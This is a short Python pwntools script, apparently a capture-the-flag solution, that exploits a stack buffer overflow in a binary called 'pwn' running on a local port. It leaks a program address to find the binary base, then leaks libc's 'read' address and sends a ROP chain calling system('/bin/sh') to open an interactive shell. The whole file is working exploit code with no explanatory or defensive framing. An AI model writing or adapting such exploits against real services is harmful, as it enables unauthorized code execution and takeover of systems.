from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
#io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",46731)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

io.recvuntil(b'How can I use ')
leak = io.recv(14)
leak = int(leak,16)
print(hex(leak))
elf_base = leak - 0x1060c
payload = b'a' * 0x20 + p64(elf_base + 0x5000) + p64(elf_base + 0x11EE)
 
io.send(payload)

io.recvuntil(b'How can I use ')
leak = io.recv(14)
leak = int(leak,16)
print(hex(leak))
offset = leak - libc.symbols['read']
system = offset + libc.symbols['system']
binsh = offset + libc.search(b'/bin/sh').__next__()
pop = offset + 0x000000000002a3e5
ret = offset + 0x00000000000029139

payload_2 = b'A'*(0x20 + 8) + p64(ret) + p64(pop) + p64(binsh) + p64(system)
io.sendline(payload_2)
io.interactive()
